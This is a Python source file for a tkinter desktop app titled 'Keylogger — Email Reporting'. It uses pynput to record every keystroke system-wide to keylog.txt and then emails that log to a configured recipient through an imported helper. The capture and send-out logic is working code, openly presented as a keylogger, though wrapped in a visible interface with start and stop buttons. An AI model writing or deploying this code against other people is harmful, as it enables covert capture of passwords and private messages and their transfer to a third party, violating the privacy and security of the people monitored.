import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
from main import validate_email, send_email_with_attachment
from pynput import keyboard
import logging
import os
import time

class KeyloggerGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("🔍 Keylogger — Email Reporting")
        self.root.geometry("680x720")

        # Theme colors
        self.bg_color = "#0f1724"        # deep navy
        self.panel_color = "#0b1220"     # slightly lighter
        self.accent_color = "#6ee7b7"     # mint
        self.alt_accent = "#60a5fa"       # light blue
        self.success_color = "#10b981"
        self.danger_color = "#ef4444"

        self.root.configure(bg=self.bg_color)

        # ttk style
        self.style = ttk.Style(self.root)
        try:
            self.style.theme_use('clam')
        except Exception:
            pass
        self.style.configure('TLabel', background=self.panel_color, foreground='white')
        self.style.configure('Header.TLabel', font=('Helvetica', 18, 'bold'), foreground='white', background=self.bg_color)
        self.style.configure('TFrame', background=self.panel_color)
        self.style.configure('Card.TLabelframe', background=self.panel_color, foreground='white')
        self.style.configure('Accent.TButton', background=self.alt_accent, foreground='black')
        self.style.map('Accent.TButton', background=[('active', '!disabled', '#53b0f0')])

        # Email configuration variables
        self.sender_email = tk.StringVar()
        self.sender_password = tk.StringVar()
        self.recipient_email = tk.StringVar()

        # Keylogger state
        self.is_logging = False
        self.listener = None

        self.setup_gui()
        
    def setup_gui(self):
        # Title
        title_frame = tk.Frame(self.root, bg=self.bg_color)
        title_frame.pack(pady=18, fill='x')

        title_label = ttk.Label(
            title_frame,
            text="🔍 Keylogger — Email Reporting",
            style='Header.TLabel'
        )
        title_label.pack(padx=20, anchor='w')

        subtitle = tk.Label(title_frame, text="A simple and elegant interface to capture and email keystrokes",
                            bg=self.bg_color, fg='#cbd5e1', font=('Helvetica', 9))
        subtitle.pack(padx=20, anchor='w')
        
        # Email Configuration Section
        self.create_email_config_section()
        
        # Status Section
        self.create_status_section()
        
        # Control Buttons Section
        self.create_control_section()
        
    def create_email_config_section(self):
        config_frame = ttk.LabelFrame(
            self.root,
            text="📧 Email Configuration",
            padding=12,
            style='Card.TLabelframe'
        )
        config_frame.pack(padx=20, pady=(18, 10), fill="x")
        
        # Sender Email
        tk.Label(
            config_frame,
            text="Sender Email:"
        ).pack(anchor="w")
        
        ttk.Entry(
            config_frame,
            textvariable=self.sender_email,
            width=50
        ).pack(pady=(0, 10), fill="x")
        
        # Sender Password
        tk.Label(
            config_frame,
            text="Password (App Password for Gmail):"
        ).pack(anchor="w")
        
        ttk.Entry(
            config_frame,
            textvariable=self.sender_password,
            show="*",
            width=50
        ).pack(pady=(0, 10), fill="x")
        
        # Recipient Email
        tk.Label(
            config_frame,
            text="Recipient Email:"
        ).pack(anchor="w")
        
        ttk.Entry(
            config_frame,
            textvariable=self.recipient_email,
            width=50
        ).pack(pady=(0, 10), fill="x")

        # Helpful hints
        hint = tk.Label(config_frame, text="Tip: For Gmail use an App Password. Your password is not saved.",
                        bg=self.panel_color, fg='#93c5fd', font=('Helvetica', 8))
        hint.pack(anchor='w', pady=(6, 0))
        
    def create_status_section(self):
        self.status_frame = ttk.LabelFrame(
            self.root,
            text="📊 Session",
            padding=12,
            style='Card.TLabelframe'
        )
        self.status_frame.pack(padx=20, pady=10, fill="both", expand=False)
        
        # Status Label
        self.status_label = tk.Label(
            self.status_frame,
            text="Status: Ready",
            font=("Helvetica", 10, 'bold'),
            fg=self.accent_color,
            bg=self.panel_color
        )
        self.status_label.pack(pady=6, anchor='w')
        
        # Key Log Display
        self.log_text = scrolledtext.ScrolledText(
            self.status_frame,
            height=12,
            width=72,
            font=("Courier", 10),
            wrap=tk.WORD,
            bg="#071029",
            fg="#e6eef6",
            insertbackground='white'
        )
        self.log_text.pack(pady=6, padx=4, fill='both')
        
    def create_control_section(self):
        control_frame = ttk.LabelFrame(
            self.root,
            text="⚙️ Controls",
            padding=12,
            style='Card.TLabelframe'
        )
        control_frame.pack(padx=20, pady=10, fill="x")
        
        # Start Button
        self.start_button = ttk.Button(
            control_frame,
            text="Start Logging",
            command=self.start_logging,
            style='Accent.TButton'
        )
        self.start_button.pack(pady=(6, 4), fill="x")
        
        # Stop Button
        self.stop_button = ttk.Button(
            control_frame,
            text="Stop and Send Log",
            command=self.stop_logging,
            state="disabled",
            style='Accent.TButton'
        )
        self.stop_button.pack(pady=(0, 8), fill="x")

        # Small utility row
        util_row = tk.Frame(control_frame, bg=self.panel_color)
        util_row.pack(fill='x', pady=(2,0))
        ttk.Button(util_row, text='Clear View', command=lambda: self.log_text.delete(1.0, tk.END)).pack(side='left')
        ttk.Button(util_row, text='Open Log', command=self.open_log_file).pack(side='left', padx=6)
        
    def validate_config(self):
        """Validate email configuration before starting"""
        if not all([
            self.sender_email.get().strip(),
            self.sender_password.get().strip(),
            self.recipient_email.get().strip()
        ]):
            messagebox.showerror(
                "Configuration Error",
                "Please fill in all email configuration fields!"
            )
            return False
            
        if not validate_email(self.sender_email.get()) or \
           not validate_email(self.recipient_email.get()):
            messagebox.showerror(
                "Configuration Error",
                "Please enter valid email addresses!"
            )
            return False
            
        return True
        
    def on_key_press(self, key):
        """Handler for key press events"""
        try:
            # Get character representation
            character = key.char
            log_text = f'Key pressed: {character}'
        except AttributeError:
            # Special key
            log_text = f'Special key pressed: {key}'
            
        # Log to file
        logging.info(log_text)

        # Update GUI (safe from other threads)
        try:
            self.log_text.insert(tk.END, log_text + "\n")
            self.log_text.see(tk.END)
        except tk.TclError:
            # If GUI closed while listener still running
            pass
        
    def start_logging(self):
        """Start the keylogger"""
        if not self.validate_config():
            return
            
        # Configure logging
        logging.basicConfig(
            filename="keylog.txt",
            level=logging.DEBUG,
            format='%(asctime)s: %(message)s',
            force=True
        )
        
        # Update GUI state
        self.status_label.config(
            text="Status: Logging Active",
            fg=self.success_color
        )
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")

        # Start keyboard listener in a separate thread
        self.is_logging = True
        self.disable_config_inputs()
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()

    # Log start of session
        logging.info("=" * 50)
        logging.info("NEW KEYLOGGER SESSION STARTED")
        logging.info(f"Will send report to: {self.recipient_email.get()}")
        logging.info("=" * 50)
        
    def stop_logging(self):
        """Stop the keylogger and send the log"""
        if self.listener:
            self.is_logging = False
            self.listener.stop()
            # Update GUI state
            self.status_label.config(
                text="Status: Preparing to send log...",
                fg=self.alt_accent,
                bg=self.panel_color
            )

            # Send email in a background thread to avoid blocking UI
            threading.Thread(target=self._send_log_background, daemon=True).start()

    def _send_log_background(self):
        # small delay for UX
        time.sleep(0.25)
        self.status_label.config(text="Status: Sending log...", fg=self.alt_accent)

        success = send_email_with_attachment(
            sender_email=self.sender_email.get(),
            sender_password=self.sender_password.get(),
            recipient_email=self.recipient_email.get(),
            subject="🔍 Keylogger Report - Session Complete",
            body="Hello,\n\nAttached is the keylogger report file.\n\nSession has ended.\n\nBest regards,\nKeylogger System",
            filename="keylog.txt"
        )

        # Update UI back on main thread
        def finish_ui():
            if success:
                messagebox.showinfo("Success", "Keylog file sent successfully! Check your email.")
                self.log_text.delete(1.0, tk.END)
            else:
                messagebox.showerror("Error", "Failed to send keylog file. Log is saved locally as 'keylog.txt'")

            self.status_label.config(text="Status: Ready", fg=self.accent_color)
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            self.enable_config_inputs()

        try:
            self.root.after(10, finish_ui)
        except Exception:
            pass

    def disable_config_inputs(self):
        # disable entries while logging
        for child in self.root.winfo_children():
            try:
                for widget in child.winfo_children():
                    if isinstance(widget, ttk.Entry):
                        widget.config(state='disabled')
            except Exception:
                pass

    def enable_config_inputs(self):
        for child in self.root.winfo_children():
            try:
                for widget in child.winfo_children():
                    if isinstance(widget, ttk.Entry):
                        widget.config(state='normal')
            except Exception:
                pass

    def open_log_file(self):
        path = os.path.abspath('keylog.txt')
        if os.path.exists(path):
            try:
                if os.name == 'nt':
                    os.startfile(path)
                else:
                    import subprocess
                    subprocess.Popen(['xdg-open', path])
            except Exception:
                messagebox.showinfo('Open Log', f'Log file located at: {path}')
        else:
            messagebox.showinfo('Open Log', 'No log file found yet.')
            
    def run(self):
        """Start the GUI application"""
        self.root.mainloop()

if __name__ == "__main__":
    app = KeyloggerGUI()
    app.run()
